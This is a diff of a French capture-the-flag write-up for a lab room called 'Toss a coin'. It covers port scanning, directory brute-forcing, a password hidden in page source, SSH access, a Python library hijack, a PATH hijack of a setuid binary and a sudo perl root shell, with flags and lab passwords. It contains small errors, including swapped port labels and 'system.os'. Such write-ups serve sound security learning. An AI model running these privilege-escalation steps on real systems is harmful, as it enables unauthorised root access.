@@ -1,30 +1,31 @@
 # Projet Socat
 ## WriteUp Room Toss a coin
-- Scan
-  - Resultat
+### Scan NMAP
+  Une fois connecté avec le VPN, la première étape consiste en un scan des ports.
+  
+  ```
+  sudo nmap -sV -p-  10.10.254.95
+  Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-29 07:34 EDT
+  Nmap scan report for 10.10.254.95
+  Host is up (0.034s latency).
+  Not shown: 65533 closed tcp ports (reset)
+  PORT   STATE SERVICE VERSION
+  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+  80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-```
-sudo nmap -sV -p-  10.10.254.95
-Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-29 07:34 EDT
-Nmap scan report for 10.10.254.95
-Host is up (0.034s latency).
-Not shown: 65533 closed tcp ports (reset)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 38.15 seconds
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 38.15 seconds
-
-```
+  ```
 
 
-  - 80 - SSH
-  - 22 - http
-- Dirbuster
-  - Report
-  - 
+  - 80 - SSH : On suppose un accès necessaire mais aucun moyen evident pour le moment.
+  - 22 - http : L'IP nous amene sur un site. Son investigation est la première piste privilégiée.
+
+### Dirbuster
+  Dirbuster nous permet d'explorer les répertoires "cachés" dans le site internet.
+  
   ```
   DirBuster 1.0-RC1 - Report
   http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
@@ -54,18 +55,202 @@ Nmap done: 1 IP address (1 host up) scanned in 38.15 seconds
   ```
   
   La suite se devine d'après les lyrics de la chanson:
+  
   ```
   http://10.10.190.15/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y/
   ```
-  Sur la page, en explorant avec F12 on accède à un mot de passe: 
+  
+  Sur cette nouvelle page, en explorant avec F12 on accède à un mot de passe: 
+  
   ```
   jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose
   ```
-- SSH - Jaskier
-- User.txtc
-- Yen
-- Geralt
-- root.txt
+  
+### SSH - Jaskier - user.txt
+ La connexion SSH est directe avec l'utilisateur "jaskier" et le mot de passe trouvé.
+ 
+ ```
+ jaskier@the-continent:~$ pwd
+/home/jaskier
+jaskier@the-continent:~$ ls -la
+total 40
+drwxr-xr-x 5 jaskier jaskier 4096 Jan 18 13:10 .
+drwxr-xr-x 6 root    root    4096 Jan 18 13:17 ..
+lrwxrwxrwx 1 root    root       9 May 25  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 jaskier jaskier  220 May 25  2020 .bash_logout
+-rw-r--r-- 1 jaskier jaskier 3771 May 25  2020 .bashrc
+drwx------ 2 jaskier jaskier 4096 May 25  2020 .cache
+drwx------ 3 jaskier jaskier 4096 May 25  2020 .gnupg
+drwxrwxr-x 3 jaskier jaskier 4096 May 25  2020 .local
+-rw-r--r-- 1 jaskier jaskier  807 May 25  2020 .profile
+-rw-r--r-- 1 root    root    1430 Jan 18 13:10 toss-a-coin.py
+-rw------- 1 jaskier jaskier   33 Jan 18 13:09 user.txt
+jaskier@the-continent:~$ 
+
+ ```
+ 
+ L'accès au user.txt est direct également, nous procurant le flag suivant:
+ 
+ ```
+ jaskier@the-continent:~$ cat user.txt 
+EPI{R3Sp3C7_D03sNT_M4k3_h1S70rY}
+
+ ```
+ 
+### Accès à Yen
+  Depuis Jaskier, on remarque plusieurs choses:
+  - un script python "root"
+    ```
+    -rw-r--r-- 1 root    root    1430 Jan 18 13:10 toss-a-coin.py
+    ```
+  - d'autres utilisateurs
+    ```
+    tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
+    jaskier:x:1001:1001:Alice Liddell,,,:/home/jaskier:/bin/bash
+    yen:x:1002:1002:White Rabbit,,,:/home/yen:/bin/bash
+    geralt:x:1003:1003:Mad Hatter,,,:/home/geralt:/bin/bash
+
+    ```
+  - des droits sudo particuliers
+    ```
+    jaskier@the-continent:~$ sudo -l
+    [sudo] password for jaskier: 
+    Matching Defaults entries for jaskier on the-continent:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User jaskier may run the following commands on the-continent:
+    (yen) /usr/bin/python3.6 /home/jaskier/toss-a-coin.py
+
+    ```
+    
+  - les sudoers
+    ```
+    ╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+    ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+    Sudoers file: /etc/sudoers.d/geralt is readable
+    geralt ALL = (root) /usr/bin/perl
+    Sudoers file: /etc/sudoers.d/jaskier is readable
+    jaskier ALL = (yen) /usr/bin/python3.6 /home/jaskier/toss-a-coin.py
+    ```
+    Le contenu du script python nous apprend un import de librairie:
+    ```
+    import random
+    ```
+    
+    
+    Compte tenu de ces informations, l'accès à Yen est possible en faisant un bypass des privilèges dy script root, en créant un nouveau script "random.py" éxecutant un shell chez Yen.
+    
+    Le contenu de random.py est le suivant: 
+    ```
+    import os;
+    system.os("/bin/bash");
+    ```
+    
+    et la commande d'éxecution pour l'accès à Yen est la suivante:
+    
+    ```
+    chmod +x random.py //on attribue les droits d'éxecution au script
+    sudo -u yen /usr/bin/python3.6 /home/jaskier/toss-a-coin.py
+    ```
+    
+    Aboutissant à la session de yen:
+    ```
+    yen@the-continent:/home/yen$ ls -la
+    total 40
+    drwxr-x--- 2 yen  yen   4096 Jan 18 13:19 .
+    drwxr-xr-x 6 root root  4096 Jan 18 13:17 ..
+    lrwxrwxrwx 1 root root     9 May 25  2020 .bash_history -> /dev/null
+    -rw-r--r-- 1 yen  yen    220 May 25  2020 .bash_logout
+    -rw-r--r-- 1 yen  yen   3771 May 25  2020 .bashrc
+    -rw-r--r-- 1 yen  yen    807 May 25  2020 .profile
+    -rwsr-sr-x 1 root root 16872 Jan 18 13:19 portal
+    ```
+
+###  Accès à Geralt
+Depuis la session de Yen, on observe à nouveau certaines singularités: un fichier "portal", setUID. Ce fichier possède donc les droits root quelque soit l'utilisateur qui l'execute.
+
+L'execution de ce script renvoie ce resultat:
+
+```
+yen@the-continent:/home/yen$ ./portal 
+I am preparing a portal for you Geralt.
+It will be ready in about Thu, 12 May 2022 15:30:30 +0000
+You just have to wait for it
+```
+
+un cat nous renvoie un contenu difficilement lisible, mais nous informe sur l'utilisation de la fonction systeme "date".
+
+Ainsi de la même manière que précédement, nous avons bypassé les droits en créant un script "date".
+
+```
+#!/bin/bash
+
+/bin/bash
+```
+
+A ceci près qu'il faut rajouter le dossier du script au PATH afin qu'il remplace la fonction systeme.
+
+```
+yen@the-continent:/home/yen$ export PATH="/home/yen/:$PATH"
+yen@the-continent:/home/yen$ $PATH
+bash: /home/yen/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin: No such file or directory
+yen@the-continent:/home/yen$ 
+```
+
+Ainsi son execution renvoie vers Geralt.
+
+```
+yen@the-continent:/home/yen$ ./portal 
+I am preparing a portal for you Geralt.
+It will be ready in about geralt@the-continent:/home/yen$ 
+```
+
+### Accès au ROOT
+
+Nous avons vu que Geralt est sudoer avec PERL.
+Une simple execution d'un schell en perl suffit donc à acceder aux droits root.
+Le mot de passe de Geralt se trouve en clair dans un fichier texte.
+
+```
+geralt@the-continent:/home/yen$ cd /home/geralt/
+geralt@the-continent:/home/geralt$ ls -la
+total 36
+drwxr-x--- 5 geralt geralt 4096 Jan 18 13:05 .
+drwxr-xr-x 6 root   root   4096 Jan 18 13:17 ..
+lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 geralt geralt  220 May 25  2020 .bash_logout
+-rw-r--r-- 1 geralt geralt 3771 May 25  2020 .bashrc
+drwx------ 2 geralt geralt 4096 Jan 18 13:05 .cache
+drwx------ 3 geralt geralt 4096 Jan 18 13:05 .gnupg
+drwxrwxr-x 3 geralt geralt 4096 May 25  2020 .local
+-rw-r--r-- 1 geralt geralt  807 May 25  2020 .profile
+-rw------- 1 geralt geralt   13 Jan 18 13:18 password.txt
+geralt@the-continent:/home/geralt$ cat password.txt 
+IH4teP0rt4ls
+geralt@the-continent:/home/geralt$ sudo perl -e 'exec "/bin/bash";'
+[sudo] password for geralt: 
+root@the-continent:/home/geralt# 
+```
+
+Ainsi les droits root nous amènent au flag root .txt:
+```
+root@the-continent:/root# ls -la
+total 36
+drwx------  6 root root 4096 Mar  9 08:26 .
+drwxr-xr-x 23 root root 4096 Mar  4 11:05 ..
+lrwxrwxrwx  1 root root    9 May 25  2020 .bash_history -> /dev/null
+-rw-------  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Jan 18 13:12 .cache
+drwx------  3 root root 4096 Jan 18 13:12 .gnupg
+drwx------  3 root root 4096 May 25  2020 .local
+-rw-------  1 root root  148 Aug 17  2015 .profile
+drwxr-xr-x  2 root root 4096 Mar  9 08:26 .ssh
+-r--------  1 root root   65 Jan 18 13:09 root.txt
+root@the-continent:/root# cat root.txt 
+EPI{D3s71Ny_1s_Ju5t_Th3_3mB0D1m3Nt_0f_Th3_S0uL_S_D3s1R3_T0_Gr0W}
+
+```
 
 ## WriteUP Room Yer a wizard
 - Token user.txt
